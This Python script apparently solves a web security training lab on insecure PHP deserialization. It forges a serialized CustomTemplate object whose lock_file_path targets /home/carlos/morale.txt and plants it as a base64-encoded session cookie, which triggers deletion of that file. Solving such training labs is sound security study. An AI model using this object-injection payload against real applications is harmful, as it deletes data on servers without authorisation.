from web_security_academy.core.logger import logger
from urllib.parse import quote
from base64 import b64encode


def solve_lab(session):
    logger.info("Source code found at /libs/CustomTemplate.php~")

    serial = 'O:14:"CustomTemplate":1:{s:30:"\x00CustomTemplate\x00lock_file_path";s:23:"/home/carlos/morale.txt";}'
    cookie = b64encode(serial.encode())
    session.cookies.set("session", quote(cookie.decode()))
    session.get_path("/")

    logger.info("Embedded the following serialized object as session cookie:")
    logger.info(serial.encode())
